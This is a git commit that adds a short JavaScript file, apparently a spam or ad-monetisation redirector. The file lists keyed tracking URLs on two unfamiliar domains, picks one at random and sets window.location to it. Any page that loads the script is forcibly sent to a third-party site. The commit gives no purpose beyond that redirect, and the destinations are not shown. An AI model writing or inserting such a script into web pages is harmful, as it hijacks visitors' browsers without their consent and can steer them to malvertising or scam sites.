f356b0fd8198de0381bb1877b883a80b39dd6520
idhoiphiy <idhoiphiy.o@gmail.com>
2026-05-09 19:51:27 +0700

    Create akeadstmingguu2.js

---
+++ akeadstmingguu2.js
@@ -0,0 +1,15 @@
+var dataUrl = [
+
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://arkgleamfox.com/si00h0ks?key=c8393b738c1749c0823f2f3709c173b0',
+'https://blessingrecordpleasant.com/k8htwf1n?key=e71c9d6f90f8e28aa9d246cdeb61e53b'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
